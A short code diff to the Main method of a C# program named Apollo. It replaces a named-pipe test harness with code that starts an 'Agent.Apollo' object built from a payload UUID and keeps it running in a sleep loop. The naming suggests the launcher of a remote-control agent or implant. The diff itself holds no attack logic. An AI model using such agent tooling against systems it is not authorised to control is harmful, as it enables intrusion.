@@ -18,38 +18,12 @@ namespace Apollo
     {
         static void Main(string[] args)
         {
-            const string namedpipename = "djh-test";
-            DummyCallback dc = new DummyCallback();
-            AsyncNamedPipeServer server = new AsyncNamedPipeServer(namedpipename, dc, null, 2);
-
-            IPCData serverSendData = new IPCData();
-            for(int i = 0; i < 10; i ++)
+            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
+            ap.Start();
+            while(ap.IsAlive())
             {
-                AsyncNamedPipeClient client = new AsyncNamedPipeClient(".", namedpipename);
-                Thread t = new Thread(() =>
-                { 
-                    try
-                    {
-                        PipeStream pipe = client.Connect(10000);
-                        string message = "test request " + i.ToString();
-                        byte[] output = Encoding.UTF8.GetBytes(message);
-                        pipe.Write(output, 0, output.Length);
-
-                        byte[] data = new byte[4096];
-                        int bytesRead = pipe.Read(data, 0, data.Length);
-
-                        Console.WriteLine(Encoding.UTF8.GetString(data, 0, bytesRead));
-                    } catch (Exception ex)
-                    {
-                        Console.WriteLine(i.ToString() + " exception: " + ex.Message);
-                    }
-                });
-                t.Start();
+                System.Threading.Thread.Sleep(1000);
             }
-            server.Stop();
-            //Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
-            //ap.Start();
-            //Console.WriteLine();
         }
     }
 
